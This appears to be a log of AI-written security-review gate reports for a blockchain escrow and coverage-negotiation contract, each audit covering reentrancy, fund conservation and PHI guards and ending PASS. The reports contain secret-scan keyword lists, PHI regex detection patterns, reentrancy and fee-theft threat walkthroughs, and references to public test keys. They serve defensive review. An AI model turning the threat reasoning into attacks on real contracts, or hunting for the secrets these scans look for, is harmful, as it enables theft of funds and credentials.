| No PHI / clinical data on-chain or in fixtures (synthetic only) | PASS | A0008 adds only value plumbing — `escrowAmount` (uint256) on the struct + the `_totalEscrowHeld` accumulator; no new free-text/content field. R4 invariant intact. Diff-wide PHI-token scan (`ssn`/`social security`/`dob`/`mrn`/`medical record`/`patient name`/`\d{3}-\d{2}-\d{4}`/date shapes) over added lines returned ONLY: (a) `_containsNamePattern` guard comments, (b) PHI-*absence* assertions, (c) the synthetic negative-test probe `"…patient John S…"` that `createContract` is asserted to **reject** (never stored — T11e), and (d) synthetic prompt-hint fixtures (`"Is this drug medically necessary for the patient's condition?"`) carrying no identifier. Test fixtures use synthetic amounts (`REQUESTED`, `2000n`) + synthetic tokens (`TOKEN_APPROVE`/`TOKEN_DENY`/`"synthetic-scrape-evidence"`); evidence URLs are public (`medlineplus.gov`, `accessdata.fda.gov`). |
| No secrets | PASS | No private keys, mnemonics, API keys, tokens, or credentials in added lines. 64-hex scan over added `.ts`/`.tsx`/`.mjs`/`.sol`/`.js` lines returned exactly one match — `0xdeadbeef…0001`, an obvious synthetic test hash, not a key. The two deterministic Anvil keys in `scripts/real-backend-localnode.mjs` are pre-existing (not in this diff's added lines), public test vectors, env-overridable. `.gitignore` changes only ADD ignores (`.codesign/`, `contracts/package-lock.json.bak.*`, `coverage/`) — never un-ignore a secret. |
| Signing-key hygiene | PASS | No new wallet/signer/key-handling code. `real.ts insurerEngage` forwards `depositAmount ?? requestedAmount` as `{ value }` through the existing `_send` helper — no key material touched. No new owner-mutable privilege surface: `withdrawFunds` stays `onlyOwner` and is now MORE restricted (bounded by `balance − _totalEscrowHeld`). Platform-callback gate `require(msg.sender == address(platform))` intact; the new escrow refund in the `PolicyInvalidated` callback branch is CEI-protected (state + `escrowAmount = 0` + `_totalEscrowHeld -=` committed before the external `.call`). |

### Value-safety — line-by-line audit (CEI + reentrancy on every ETH path)

Re-read `CoverageNegotiation.sol` end-to-end. Every ETH-moving function carries
`nonReentrant` (or is the platform-gated callback) and commits state + `escrowAmount = 0`
+ `_totalEscrowHeld -= escrow` BEFORE any `.call{value}`, with a checked return:

| Path | Guard | Effects-before-interaction | Checked return |
| --- | --- | --- | --- |
| `insurerEngage` surplus refund (L443) | `payable nonReentrant`, `state==Open` | escrow/state/`_totalEscrowHeld+=` L454–458 before refund L465 | `require(ok,"escrow: refund failed")` |
| `settle` Approved/Denied (L613) | `nonReentrant`, `state∈{Approved,Denied}` + both-accepted | L625–628 before L636/L642 | both `require(okP/okI,…)` |
| `refuse` (L652) | `nonReentrant`, `_refusable` | L661–664 before L669 | `require(ok,…)` |
| `withdraw` (L679) | `nonReentrant`, `!_terminal` | L688–691 before L696 | `require(ok,…)` |
| `submitEvidence` deadlock (L502) | `nonReentrant`, `state==EvidenceRequested` | L507–509 before L514/L518 | both `require(ok/ok2,…)` |
| `appeal` deadlock (L559) | `nonReentrant`, `state==Denied` | L564–566 before L571/L575 | both `require(ok/ok2,…)` |
| `PolicyInvalidated` (decide callback L903) | `msg.sender==platform`, `state==UnderReview` | L909–912 before L919 | `require(ok,…)` |
| `withdrawFunds` (L356) | `onlyOwner nonReentrant` | `drainable = balance − _totalEscrowHeld` L358 | `require(ok,…)` |

- **Conservation.** Approved settle: `covered = requestedAmount = escrow` ⇒ remainder 0; `covered + remainder == escrow` always. Denied/terminal: full `escrow → insurer`. No path mints or forwards ETH the contract did not receive.
- **`_totalEscrowHeld` cannot underflow or double-release.** `+= escrow` happens once, guarded by `state==Open` (engage flips to `Ready`). Every `-= escrow` is paired with a terminal/state transition that makes the path unreachable again, and reads the captured `n.escrowAmount` (already 0 after first execution). Solidity 0.8 checked arithmetic backstops it. `withdraw` from `Open` (escrow 0) subtracts 0 and skips transfer (`if (escrow > 0)`) — tested.
- **Escrow ring-fenced from the agent-fee float.** Agent fees flow through `platform.createRequest{value}` in `_fireScrape`/`_fireDecide`; `withdrawFunds` is bounded by `_totalEscrowHeld`, so the owner can never drain live escrow (A0008-S4a). The owner *can* still reclaim the agent-fee/parked-decide-fee float — that is `withdrawFunds`'s documented purpose and a pre-existing trusted-owner surface (Amendment 0007), unchanged by and out of scope for this escrow unit; not a finding.

### Off-chain mirror — re-checked field-by-field

`real.ts` `RawNegotiation` (38 elements, indices 0–37) and `_decodeNegotiation` were
re-verified against the `abi.ts getNegotiation` tuple and the Solidity struct by
enumerating all 38 fields: `escrowAmount` at index 13, `lastRequestId` 20, `hasRuling`
21, `agentEvidenceUrl`/`agentPromptHint` 22/23, `round` 24, trailing
`agentPhase`/`pendingDecideFee`/`pendingFeePayer` 35–37 — all aligned. No mis-decode
that could misattribute or leak `escrowAmount`. The simulated backend mirrors the
payable `insurerEngage(…, depositAmount?)` signature, the `escrow: underfunded`
rejection, sets `escrowAmount = requestedAmount` on engage, and zeroes it on every
settle/terminal path (the refresh-5 fidelity gap is closed — verified in
`simulated.transitions.test.ts` A0008-SIM-BEH cases). Implementation note (safe
divergence): the amendment-doc snippet sets `escrowAmount = msg.value`; the shipped
contract conservatively sets `escrowAmount = requestedAmount` and refunds the surplus —
stricter, matches the unit task.

### Verification run (this gate)

- `npx hardhat compile` → clean (8 Solidity files, 42 typings).
- `npx hardhat test` → **166 passing**, including A0008-S1a..S4c (engage underfund
  revert, overpay refund, settle-approve/deny transfers, all four terminal-non-settle
  escrow refunds, `contract balance == 0` after every settled/terminal path,
  `withdrawFunds` cannot drain escrow) and every `RevertingReceiver` `require`-fail
  branch (settle/refuse/withdraw/deadlock/policy_invalid/engage-refund).
- `npm run test:lib` → **258 passing**, including simulated/real escrow-mirror parity
  and the `DRUG_EVIDENCE_MAP` NO-PHI invariant.

### Verdict: PASS (zero findings)

---

## 2026-06-03 (refresh 5) — Amendment 0008: real escrow settlement (security-review, TOTAL-STICKLER)

**Date:** 2026-06-03
**Reviewer:** Claude Opus 4.8 (security-review gate, TOTAL-STICKLER mode)
**Base:** `origin/main`
**Branch:** `spec-6-implementation` + uncommitted working tree
**Scope of change (Amendment 0008 / SPEC-0001 R8 unit):** Make settlement move
real ETH. `insurerEngage` becomes `payable` and requires `msg.value >=
requestedAmount`, sets `n.escrowAmount = requestedAmount`, refunds any surplus to
the insurer. New `escrowAmount` field on the `Negotiation` struct + a contract-wide
`_totalEscrowHeld` accumulator. `settle` now transfers `coveredAmount → provider`
and refunds `escrowAmount − coveredAmount → insurer` on the Approved path, and
refunds the full `escrowAmount → insurer` on the Denied path. Every terminal-non-
settle outcome (`Deadlocked` via the `submitEvidence`/`appeal` round-cap short-
circuits, `ProviderRefused`, `PolicyInvalidated` via the decide callback,
`Withdrawn`) refunds the full `escrowAmount → insurer`. `withdrawFunds` is bounded
to `address(this).balance − _totalEscrowHeld` so the owner can never drain escrow.
Off-chain mirrors (`abi.ts`, `real.ts` decoder + payable `insurerEngage`,
`types.ts`, `coverage.types.ts`, `simulated.ts`) updated to the new struct/signature.
Hardhat tests A0008-S1a..S4c added (engage underfund/overpay, settle-approve/deny,
each terminal-non-settle path, balance==0 invariants, reverting-recipient `require`
branches).
**Verdict:** PASS (zero findings)

### Hard gate

| Gate | Status | Evidence |
| --- | --- | --- |
| No PHI / clinical data on-chain or in fixtures (synthetic only) | PASS | A0008 adds only value-flow plumbing: the new `escrowAmount` / `_totalEscrowHeld` are `uint256` amounts; no new free-text or content field is stored. R4 invariant intact. Diff-wide PHI scan (SSN/DOB/MRN/`patient name`/`\d{3}-\d{2}-\d{4}`/date shapes) over added `.sol`/`.ts` lines returned only PHI-*absence* assertions and the existing `_containsNamePattern` `[A-Z][a-z]+ [A-Z]` guard on `agentPromptHint`. Test fixtures use synthetic amounts (`REQUESTED`, `1500n`) and synthetic decision tokens (`"synthetic-scrape-evidence"`, `TOKEN_APPROVE`/`TOKEN_DENY`); evidence URLs are public (`medlineplus.gov`, `accessdata.fda.gov`). `drugEvidenceMap.{ts,test.ts}` carry only public drug-class criteria + a NO-PHI regression test. |
| No secrets | PASS | No private keys, mnemonics, API keys, tokens, or credentials added. Full-diff 64-hex key scan returned only the two well-known deterministic Hardhat/Anvil accounts (#0 `0xac0974be…`, #1 `0x59c6995e…`) in `scripts/real-backend-localnode.mjs` — public test vectors, env-overridable (`LOCAL_KEY`/`LOCAL_INSURER_KEY`), pre-existing (not in this diff's added lines). `.gitignore` changes only ADD ignores (`.codesign/`, `*.bak.*`, `coverage/`); they never un-ignore a secret. |
| Signing-key hygiene | PASS | No new wallet construction, signer, or key-handling code. `real.ts insurerEngage` forwards `depositAmount` as `{ value }` via the existing `_send` helper; no key material is touched. No new owner-mutable privilege surface — `withdrawFunds` stays `onlyOwner` and is now MORE restricted (bounded by `balance − _totalEscrowHeld`). The platform-callback gate `require(msg.sender == address(platform))` is intact; the new escrow refund inside the `PolicyInvalidated` callback branch is CEI-protected (state + `escrowAmount = 0` committed before the external `.call`). |

### Value-safety review (CEI + reentrancy on every value-moving path)

Every ETH-moving function follows checks-effects-interactions and carries
`nonReentrant`, verified line-by-line in `CoverageNegotiation.sol`:

| Path | `nonReentrant` | State + `escrowAmount=0` + `_totalEscrowHeld-=` before `.call` | Checked return |
| --- | --- | --- | --- |
| `insurerEngage` (surplus refund) | yes (L441) | escrow/state committed L452–456 before refund L463 | `require(ok,"escrow: refund failed")` |
| `settle` Approved/Denied | yes (L611) | L625–627 before transfers L633/L639 | `require(okP/okI,…)` both |
| `refuse` | yes (L649) | L659–661 before L666 | `require(ok,…)` |
| `withdraw` | yes (L676) | L686–688 before L693 | `require(ok,…)` |
| `submitEvidence` deadlock | yes (L490) | L505–507 before L516 | `require(ok2,…)` |
| `appeal` deadlock | yes (L545) | L562–564 before L573 | `require(ok2,…)` |
| `PolicyInvalidated` (decide callback) | callback gated to `platform`; CEI | L907–909 before L916 | `require(ok,…)` |
| `withdrawFunds` (owner) | yes (L354) | drainable = `balance − _totalEscrowHeld` (L356) | `require(ok,…)` |

- **No fund-stranding path.** The five terminal states (`Settled`, `Deadlocked`,
  `PolicyInvalidated`, `ProviderRefused`, `Withdrawn`) each zero `escrowAmount` and
  release/refund it. `withdraw` is reachable from every pre-terminal state by either
  party, so escrow is always recoverable; nothing can wedge funds in a live
  negotiation. Verified by tests asserting `contract balance == 0` after every
  settled and every terminal-non-settle path (A0008-S2a/S2c/S3a–d/S4b/S4c).
- **Escrow vs agent-fee float never commingle.** Agent fees are forwarded in full
  to the platform (or refunded to the caller) in `_fireScrape`/`_fireDecide`/
  timeout paths; escrow is tracked separately by `_totalEscrowHeld` and is
  ring-fenced from `withdrawFunds` (A0008-S4a).
- **`_totalEscrowHeld` cannot underflow.** Incremented by exactly `requestedAmount`
  once at engage; decremented by exactly the stored `n.escrowAmount` on the first
  (state-guarded) terminal transition; Solidity 0.8 checked arithmetic backstops it.

### Accepted design tradeoff (NOT a finding)

Amendment 0008 §4 sanctions a **push** model for v0 (`payable(addr).call{value}`
with checked return + `nonReentrant`), noting pull-over-push is *preferred* and that
"the security-auditor gate decides." A contract recipient whose `receive()` reverts
can cause the whole settling/terminal tx to revert — an availability concern (a party
could temporarily block its own refund/release), **not** a fund-loss concern: CEI
means a reverted tx commits no state, so escrow stays held and is retriable (and
`withdraw` remains available). For the demo, both parties are EOAs, so this cannot
trigger. The `require(ok,…)`-fail branches are explicitly tested via
`RevertingReceiver` (settle/refuse/withdraw/deadlock/policy_invalid/engage-refund).
This is the documented, in-scope v0 shape; if a hostile contract counterparty ever
becomes in-scope, migrate refunds/releases to a pull `owed[addr] += amount` +
`withdraw()` ledger (already flagged in the amendment).

### Off-chain mirror correctness (no security impact; verified for completeness)

The `real.ts` `RawNegotiation` tuple + `_decodeNegotiation` index map was checked
field-by-field against the Solidity struct and the `abi.ts getNegotiation` tuple:
`escrowAmount` at index 13, `agentEvidenceUrl`/`agentPromptHint` at 22/23, trailing
`agentPhase`/`pendingDecideFee`/`pendingFeePayer` at 35–37 — all aligned. The
simulated backend mirrors the payable `insurerEngage(…, depositAmount?)` signature
and the `escrow: underfunded` rejection, and stores `escrowAmount` on engage. (Note,
non-security: the simulated backend does not zero `escrowAmount` on its terminal
paths, since it holds no real ETH; this is a fidelity gap, not a vulnerability.)

### Verification run

`npx hardhat compile` clean; `npx hardhat test` → **169 passing**, including all
A0008-S1a..S4c escrow tests and every `RevertingReceiver` `require`-fail branch.
Off-chain `npm run test:lib` → **256 passing** (simulated/real escrow-mirror parity
+ drug-evidence-map NO-PHI invariant). Re-verified independently by the gate on
2026-06-03.

### Verdict: PASS (zero findings)

---

## 2026-06-03 (refresh 4) — Amendment 0007 phase 1: two-agent scrape→decide pipeline (security-review)

**Date:** 2026-06-03
**Reviewer:** Claude Opus 4.8 (security-review gate, TOTAL-STICKLER mode)
**Base:** `origin/main`
**Branch:** `feat/amendment-0007-two-agent-pipeline` + uncommitted working tree
**Scope of change:** Split the single `_fireAgent` adjudication into a two-agent
sequential pipeline (Amendment 0007 phase 1). Add `AgentPhase` enum
(`None`/`Scraping`/`Deciding`) + `pendingDecideFee`/`pendingFeePayer` fields on the
`Negotiation` struct; `LLM_PARSE_WEBSITE_AGENT_ID` constant (`12875401142070969085`)
+ minimal `ILLMParseWebsiteAgent.ExtractString` interface (selector `0xc2dd1a7a`).
`requestAdjudication`/`submitEvidence`/`appeal` now fund BOTH calls in one `msg.value`
(`2×(getRequestDeposit()+agentReward)`), fire LLM Parse Website against
`n.agentEvidenceUrl`, and park the decide fee. `handleResponse` branches on
`agentPhase`: Scraping-success decodes the extracted string and fires LLM Inference
(`_fireDecide`) from the parked fee; Deciding-success runs the existing token decode +
state transition; a non-Success callback in either phase refunds the parked decide fee
to the stored payer and routes to `EvidenceRequested`. `scripts/check-ruling-abi.ts`
extended to pin the `ExtractString` selector alongside `inferString`. Hardhat tests:
two-call mock keyed by agentId, updated fee math, full scrape→decide→Approve/Deny +
failure paths.
**Verdict:** PASS (zero findings)

### Hard gate

| Gate | Status | Evidence |
| --- | --- | --- |
| No PHI / clinical data on-chain or in fixtures (synthetic only) | PASS | R4 invariant preserved — only hashes/refs/amounts/codes/state/ids/addresses/timestamps + the two caller/curated public strings (`agentEvidenceUrl`, `agentPromptHint`) are stored. The new `_fireScrape` payload is built from `n.agentEvidenceUrl` + static framing; `_fireDecide`'s `inferString` prompt is `n.agentPromptHint` + `n.agentEvidenceUrl` + the scraped `evidence` string + static framing — no patient data is concatenated. The `_containsNamePattern` `[A-Z][a-z]+ [A-Z]` PHI guard on `agentPromptHint` at `createContract` is retained. Diff-wide PHI scan (SSN/DOB/MRN/`patient name`/`[0-9]{3}-[0-9]{2}-[0-9]{4}`/date shapes) over added `.sol`/`.ts` lines returned only (a) guard-name comments, (b) PHI-*absence* assertions in tests, and (c) the synthetic negative-test probe `"John S"` (`CoverageNegotiation.test.ts:2321`, an input the contract is asserted to **reject** — never stored). Evidence-URL fixtures are public (`medlineplus.gov/druginfo/meds/*`, `accessdata.fda.gov` FDA label PDF). |
| No secrets | PASS | No private keys, mnemonics, API keys, tokens, or credentials in the diff. The two 64-hex keys in `scripts/real-backend-localnode.mjs` are the well-known deterministic Anvil/Hardhat accounts #0/#1 (public test vectors, env-overridable via `LOCAL_KEY`/`LOCAL_INSURER_KEY`) and are pre-existing — not part of this diff's added lines. `verify-deploy.ts` reads `VITE_PRIVATE_KEY` from `.env` only to derive an address (`ethers.Wallet(...).address`); no transaction is signed/sent and the key is not logged. Tests assert the banned `@anthropic-ai/sdk` / `ANTHROPIC_API_KEY` path stays removed (G3). |
| Signing-key hygiene | PASS | No new key-handling, wallet-construction, or signer code. The two new constants + interface add **no** setters (no new owner-mutable / privilege surface). All admin mutators (`setPlatform`/`setAgentId`/`setAgentReward`/`setRulingTimeout`/`setMaxRounds`/`withdrawFunds`) and the keeper `commitRationale` remain `onlyOwner`. The platform-callback gate `require(msg.sender == address(platform), "callback: not platform")` is intact and now governs both pipeline phases. |

### Threat walk-through (Amendment 0007 two-agent pipeline)

**T1 — Fee theft / ETH double-spend across the two calls.** PASS. `_fireScrape`
(`CoverageNegotiation.sol:935`) requires `msg.value >= 2×perCallFee`, forwards exactly
`perCallFee` to the scrape `createRequest`, parks the second `perCallFee` in the
contract balance (recorded in `n.pendingDecideFee`), and refunds any excess to the
caller. On scrape-success `_handleScrapeResponse` zeroes `pendingDecideFee` and forwards
that exact parked amount to `_fireDecide`'s `createRequest{value: decideFee}`. On
scrape-failure the parked amount is refunded to `n.pendingFeePayer`. Every branch
conserves value: forwarded + parked + refunded == `msg.value`. No path mints ETH or
forwards an amount the contract did not receive. `totalFees` (scrape += in `_fireScrape`,
decide += in `_fireDecide`) is a settlement **event marker only** (no token transfer per
R8), so even an accounting skew on a failure path moves no funds.

**T2 — Reentrancy via the callback's untrusted-payer refund.** PASS.
`handleResponse` is gated to `msg.sender == address(platform)` (owner-set, trusted) and
requires `_requestToNegotiation[requestId] != 0` **and** `n.state == UnderReview`. The
only external call to an *untrusted* address inside the callback is the scrape-failure
refund `payable(payer).call{value: refund}` in `_handleScrapeResponse:719`. By that
point CEI is complete: `_clearRequest` has deleted the request→negotiation mapping,
`pendingDecideFee`/`pendingFeePayer` are zeroed, `agentPhase=None`, and `state` is set to
`EvidenceRequested`. A reentrant `handleResponse` therefore fails the `reqId != 0`
(mapping deleted) and/or `state == UnderReview` checks and cannot re-trigger a refund or
mutate the negotiation. The scrape-success external call (`_fireDecide` →
`platform.createRequest`) targets the trusted platform only. (The three payable entry
points `requestAdjudication`/`submitEvidence`/`appeal` retain `nonReentrant`.)

**T3 — Stale `pendingFeePayer` enabling a double-refund / drain.** PASS. A payer-funded
refund occurs **only** in the scrape-failure branch, which sets `refund =
n.pendingDecideFee` and zeroes both `pendingDecideFee` and `pendingFeePayer` *before* the
`.call`, guarded by `if (refund > 0)`. On scrape-**success**, `pendingDecideFee` is
zeroed (forwarded to the decide call) while `pendingFeePayer` is intentionally left set —
but no later code path refunds based on `pendingFeePayer` without first reading a non-zero
`pendingDecideFee`, and the decide-failure branch performs no payer refund at all
(`pendingDecideFee` is already 0 there). A subsequent `_fireScrape` (retry via
`submitEvidence`/`appeal`) overwrites both fields fresh. No stale-payer drain vector.

**T4 — Malformed/garbage agent payload (deserialization).** PASS. Both
`abi.decode(responses[0].result, (string))` calls consume data delivered by the trusted,
gated platform. A malformed payload reverts the decode (Solidity ABI decode is
memory-safe — no buffer/overflow class exists), which merely stalls the in-flight ruling;
recovery is the existing keeper `onRulingTimeout` → `EvidenceRequested`. An out-of-vocab
decision **token** falls through `_tokenToDecision` defensively to non-terminal
`NeedMoreEvidence` (never advances to a terminal state on garbage input). No injection,
no unsafe transition.

**T5 — Selector / agent-id drift.** PASS (hardening preserved). `check-ruling-abi.ts`
now computes and pins **both** selectors — `inferString` (`0xfe7ca098`) and the new
`ExtractString` (`0xc2dd1a7a`) — from their canonical signatures, asserts
`_fireScrape` body uses `ILLMParseWebsiteAgent.ExtractString.selector` and
`_fireDecide`/legacy `_fireAgent` uses `ILLMInferenceAgent.inferString.selector`, and
self-checks that both selector literals appear in the script. The two agent ids are
`public constant`s. A silent selector/id swap is caught by the gate.

### Standard categories examined

- **Injection** (SQL / command / path / template / XXE / NoSQL): none. No new
  untrusted-input → shell/fs/DB/template path. `check-ruling-abi.ts` reads only a fixed
  `.sol` path and its own source (`import.meta.url`); no user-controlled paths.
- **Auth / authz**: callback gate + all `onlyOwner` mutators + party gates on the payable
  entry points unchanged. The two new constants + interface add no callable surface.
- **Crypto / randomness**: none added. `_tokenToDecision` is constant-set keccak
  membership (standard).
- **Data exposure**: nothing sensitive logged/emitted; events carry ids/amounts/decision
  codes only. The scraped `evidence` string is passed into the inference prompt but never
  stored on-chain.
- **XSS / web**: no `web/src` changes in this unit; the contract changes have no DOM sink.

### Files reviewed

`contracts/contracts/CoverageNegotiation.sol`,
`contracts/contracts/mocks/MockAgentPlatform.sol`,
`contracts/contracts/mocks/RevertingReceiver.sol`,
`contracts/test/CoverageNegotiation.test.ts`, `scripts/check-ruling-abi.ts`,
`scripts/verify-deploy.ts`, `scripts/real-backend-localnode.mjs`,
`web/src/drugEvidenceMap.ts`, `docs/progress/*`.

### Verdict

**PASS — zero findings.** The two-agent split conserves caller ETH on every branch
(forward + park + refund == `msg.value`), preserves CEI on the un-guarded `handleResponse`
callback (the untrusted-payer refund runs only after the request mapping is deleted and
state has left `UnderReview`), introduces no new owner/privilege surface, and keeps the
PHI guard + synthetic-only fixtures intact. Selector-drift hardening was extended to the
new `ExtractString` selector. Net: new attack surface is bounded to the trusted
platform-callback path, which retains its `msg.sender == platform` gate.

---

## 2026-06-03 (refresh 3) — drug-evidence map + Create.tsx auto-fill (security-review)

**Date:** 2026-06-03
**Reviewer:** Claude Opus 4.8 (security-review gate, TOTAL-STICKLER mode)
**Base:** `origin/main`
**Branch:** `feat/drug-evidence-map` (working tree)
**Scope of change:** Add `web/src/drugEvidenceMap.ts` — a curated `{drugName → {evidenceUrl,
promptHint}}` map covering the six SPEC-0006 R18 examples (Adalimumab, Semaglutide,
Ustekinumab, Lecanemab, Tirzepatide, Dupilumab) plus brand aliases — and its unit test
`web/src/drugEvidenceMap.test.ts`. Wire `evidenceForDrug()` into `Create.tsx` via
`applyDrugLookup(rawDrug)` so drug-name entry auto-fills `agentEvidenceUrl` +
`agentPromptHint`; both fields stay manually overridable; `create-submit` is disabled when
either is empty; `onSubmit` now sends the two fields **from state** (`.trim()`) instead of any
hardcoded fallback. `package.json` `test:lib` glob extended to `web/src/**/*.test.ts`.
**Verdict:** PASS (zero findings)

### Hard gate

| Gate | Status | Evidence |
| --- | --- | --- |
| No PHI / clinical data on-chain or in fixtures (synthetic only) | PASS | The curated map contains only **public** drug-evidence URLs (`medlineplus.gov/druginfo/meds/*`, one `accessdata.fda.gov` FDA label PDF) and generic clinical-question prompt hints that reference the public drug name + indication only — no patient names, MRNs, DOBs, SSNs, phones, or emails. Verified programmatically: every one of the six hints clears the contract's own `_containsNamePattern` `[A-Z][a-z]+ [A-Z]` PHI guard (zero hits), every `evidenceUrl` ≤ 512 bytes and every `promptHint` ≤ 1024 bytes — so the curated values are accepted on-chain *and* are name-pattern-clean. The module ships a PHI-free invariant test (SSN/DOB/phone/email regex over `JSON.stringify(DRUG_EVIDENCE_MAP)`, all negative). In `Create.tsx`, the patient justification body still stays off-chain (only its `keccak256` `justificationHash` is committed); the two new on-chain strings are caller/curated values, structurally separate from any patient data. Diff-wide PHI-token scan over added code/fixtures returned only guard-name comments and the **synthetic negative-test probe** `"John S"` (the T11e input the contract is asserted to *reject* — never stored). |
| No secrets | PASS | No private keys, mnemonics, API keys, tokens, or credentials in the added files. `drugEvidenceMap.ts`/`.test.ts` are pure data + a normaliser + a lookup function — no I/O, network, fs, env-var reads, `eval`, or dynamic code. Full-diff 64-hex private-key scan (excluding the findings prose) returned zero. `.gitignore` changes only *add* ignores (`.codesign/`, `*.bak.*`, `coverage/`) — they never un-ignore a secret. |
| Signing-key hygiene | PASS | This unit touches no key-handling, wallet-construction, or signer code. `Create.tsx`'s new fields flow only into a React-escaped controlled `<input value={…}>` and into the existing `createContract({…})` call as `.trim()`ed strings; they are never rendered as an `href`, never passed to `dangerouslySetInnerHTML` (zero occurrences in `web/src`), and never logged. The broader branch diff is a net attack-surface *reduction*: the banned Anthropic/self-hosted secret-consuming path (`@anthropic-ai/sdk`, `scripts/orchestrator-real.ts`, `orchestrator:real`) is removed. |

### Integrity / correctness checks (non-gate, verified clean)

- **Map tests pass.** `node --import tsx --test web/src/drugEvidenceMap.test.ts` → 25/25 pass
  (six R18 keys present, non-empty url+hint, case-insensitive + brand-alias + parenthetical
  RxNorm/NDC-suffix strip, unknown/empty/whitespace → `null`, PHI-free invariant).
- **Typecheck clean.** `npm run typecheck` (tsc `--noEmit`) succeeds with the wiring.
- **Spec behaviour confirmed in `Create.tsx`.** `applyDrugLookup` only overwrites the two
  fields on a non-null match, so manual override survives (the per-field `onChange` setters are
  retained); `create-submit` `disabled` now also gates on `agentEvidenceUrl.trim() === "" ||
  agentPromptHint.trim() === ""`; the old hardcoded MedlinePlus fallback + generic hint are
  gone from `onSubmit` (the only remaining `medlineplus`/generic-hint literals are the
  `DEFAULT_AGENT_*` **Hardhat test fixtures** in `contracts/test/CoverageNegotiation.test.ts`,
  synthetic and appropriate).

### Non-security observations (recorded for the build loop, not gate findings)

- An unknown drug returns `null`, leaving both fields empty → `create-submit` stays disabled
  until the user supplies a manual override. Intended (no on-chain drug whitelist; R20). Not a
  security issue.

---

## 2026-06-03 (refresh 2) — SPEC-0006 R14/R15/R17 per-negotiation agent fields (security-review)

**Date:** 2026-06-03
**Reviewer:** Claude Opus 4.8 (security-review gate, TOTAL-STICKLER mode)
**Base:** `origin/main` (d7b5190)
**Branch:** `spec-6-implementation` + uncommitted working tree
**Scope of change:** Add per-negotiation `agentEvidenceUrl` + `agentPromptHint` to the
`Negotiation` struct and `createContract` signature (R14/R15/R17); remove the
contract-level `agentEvidenceUrl` global and its `setAgentEvidenceUrl` owner-setter;
rewire `_fireAgent` to read `n.agentEvidenceUrl` and embed `n.agentPromptHint` instead of
the hardcoded `"rheumatoid arthritis"` global; propagate the two trailing string params
through `CreateContractParams`, `simulated.ts`, and `real.ts`; add Hardhat T9/T10/T11.
**Verdict:** PASS (zero findings)

### Hard gate

| Gate | Status | Evidence |
| --- | --- | --- |
| No PHI / clinical data on-chain or in fixtures (synthetic only) | PASS | The two new on-chain strings are caller-supplied and structurally separate from the patient justification body, which stays off-chain — only its opaque `keccak256` `justificationHash` is on-chain. `_fireAgent` (`CoverageNegotiation.sol:806-816`) builds the `inferString` prompt from exactly `n.agentPromptHint` + `n.agentEvidenceUrl` + static framing; no patient data is concatenated. Every fixture in the diff is public, non-PHI: evidence URLs `https://medlineplus.gov/druginfo/meds/a603010.html` and `https://www.fda.gov/media/119435/download` (public drug-info / FDA pages); prompt hints are generic clinical *questions* (drug + indication only) with no names, MRNs, DOB, or SSNs. The hardcoded `"rheumatoid arthritis"` prompt is deleted from the contract (the only remaining occurrence in-tree is a synthetic *policy* description in `src/data/policies.ts`, pre-existing, outside this diff). Diff-wide scan for `private key`/64-hex/`mnemonic`/`secret`/`password`/`api key`/`ssn`/`mrn`/`dob`/`date of birth`/`patient name` returned zero matches. |
| No secrets | PASS | No private keys, mnemonics, API keys, tokens, or credentials anywhere in the diff. The new fields carry only public URLs and clinical-question strings. |
| Signing-key hygiene | PASS | Diff touches no key-handling, wallet-construction, or signer code (`src/wallet/*` unchanged). Net attack-surface *reduction*: removing `setAgentEvidenceUrl(string) onlyOwner` eliminates a piece of owner-mutable on-chain state; evidence URL/hint are now fixed per negotiation at `createContract` time by the provider (the `msg.sender == providerAddr` gate is retained). |

### Integrity checks (non-gate, verified clean)

- **Struct ↔ ABI ↔ decode ordering.** New fields inserted at the same position (after
  `lastRequestId`/`hasRuling`, before `round`) in all three representations: the Solidity
  struct (`CoverageNegotiation.sol:117-118`), the `getNegotiation` tuple in
  `src/contract/abi.ts`, and the `RawNegotiation` index map + decode in
  `src/contract/real.ts` (`raw[21]`→`agentEvidenceUrl`, `raw[22]`→`agentPromptHint`, all
  later indices shifted +2). No tuple mis-decode that could misattribute or leak a field.
- **Defense-in-depth guard parity.** `createContract` reverts `evidence: url required` /
  `evidence: hint required` on empty input (`CoverageNegotiation.sol:355-356`), mirrored
  in `SimulatedBackend.createContract` (`src/contract/simulated.ts:290-291`); T11a/b assert
  both revert strings.
- **Clean compile.** `npx hardhat compile --force` succeeds (8 Solidity files, 40
  typings) — the struct/ABI changes are valid and self-consistent.

### Non-security observations (recorded for the build loop, not gate findings)

- SPEC-0006 R14/R15 upper length caps (URL ≤ 512 bytes, hint ≤ 1024 bytes): **enforced**
  at `CoverageNegotiation.sol:355-365` (`bytes(url).length > 0 && <= 512`;
  `bytes(hint).length > 0 && <= 1024`). Covered by passing tests T11c and T11d.
- SPEC-0006 R15's `[A-Z][a-z]+ [A-Z]` PHI-name pattern reject: **enforced** on-chain by
  `_containsNamePattern` (`CoverageNegotiation.sol:766-792`), mirrored in
  `simulated.ts`. Covered by passing test T11e.

---

## 2026-06-03 — SPEC-0006 `inferString` cascade (security-review)

**Date:** 2026-06-03
**Reviewer:** Claude Opus 4.8 (security-review gate, TOTAL-STICKLER mode)
**Base:** `origin/main` (d7b5190)
**Branch:** `spec-6-implementation` + uncommitted working tree (the `inferString` cascade)
**Scope:** diff in `.` vs `origin/main`, including the uncommitted contract/scripts changes.
**Verdict:** PASS (zero findings)

### Result

No high- or medium-confidence security vulnerabilities identified. The change set is
primarily a *removal* of attack surface (self-hosted orchestrator path, secret-consuming
SDK) plus a payload/decoder swap. Net security improvement.

### Hard gate

| Gate | Status | Evidence |
| --- | --- | --- |
| No PHI / clinical data on-chain or in fixtures (synthetic only) | PASS | R4 hard invariant preserved — only `bytes32` hashes/refs, amounts, codes, addresses, ids on-chain. The `inferString` prompt references only the public MedlinePlus drug-info URL (`agentEvidenceUrl`), no patient data. `commitRationale` stores `keccak256` of clause/standard references; the free-text `rationale` is keeper-supplied with no patient-data path and is byte-truncated at `MAX_RATIONALE_BYTES` (4096). Hardhat tests use synthetic decision tokens (`TOKEN_APPROVE`/`TOKEN_DENY`/`TOKEN_NEEDS_MORE_INFO`/`TOKEN_POLICY_INVALID`) only. PHI marker scan (patient/DOB/SSN/MRN/name/medical-record) over added `.sol`/`.ts`/`.json` lines: no matches. |
